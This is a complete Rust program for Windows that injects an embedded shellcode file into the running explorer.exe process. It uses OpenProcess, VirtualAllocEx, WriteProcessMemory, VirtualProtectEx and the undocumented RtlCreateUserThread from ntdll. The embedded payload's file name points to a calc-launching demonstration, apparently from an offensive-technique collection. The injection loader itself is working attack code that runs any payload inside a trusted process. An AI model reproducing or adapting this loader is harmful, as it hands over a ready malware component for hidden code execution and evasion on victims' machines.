use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::{null, null_mut};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE, HANDLE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

#[cfg(target_os = "windows")]
fn main() {
    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
    let shellcode_size = shellcode.len();
    let mut old = PAGE_READWRITE;

    let mut system = System::new();
    system.refresh_processes();
    let pid = system
        .processes_by_name("explorer.exe")
        .next()
        .expect("[-]no process!")
        .pid()
        .as_u32();

    unsafe {
        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll == 0 {
            panic!("[-]LoadLibraryA failed: {}!", GetLastError());
        }

        let fn_rtl_create_user_thread = GetProcAddress(ntdll, b"RtlCreateUserThread\0".as_ptr());

        let rtl_create_user_thread: extern "C" fn(
            HANDLE,
            isize,
            isize,
            isize,
            isize,
            isize,
            *mut c_void,
            isize,
            *mut HANDLE,
            isize,
        ) = transmute(fn_rtl_create_user_thread);

        let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if handle == 0 {
            panic!("[-]OpenProcess failed: {}!", GetLastError());
        }

        let addr = VirtualAllocEx(
            handle,
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
        }

        let res = WriteProcessMemory(
            handle,
            addr,
            shellcode.as_ptr().cast(),
            shellcode_size,
            null_mut(),
        );
        if res == FALSE {
            panic!("[-]WriteProcessMemory failed: {}!", GetLastError());
        }

        let res = VirtualProtectEx(handle, addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
        }

        let mut thraed: HANDLE = 0;
        rtl_create_user_thread(handle, 0, 0, 0, 0, 0, addr, 0, &mut thraed, 0);

        let res = CloseHandle(handle);
        if res == FALSE {
            panic!("[-]CloseHandle failed: {}!", GetLastError());
        }
    }
}
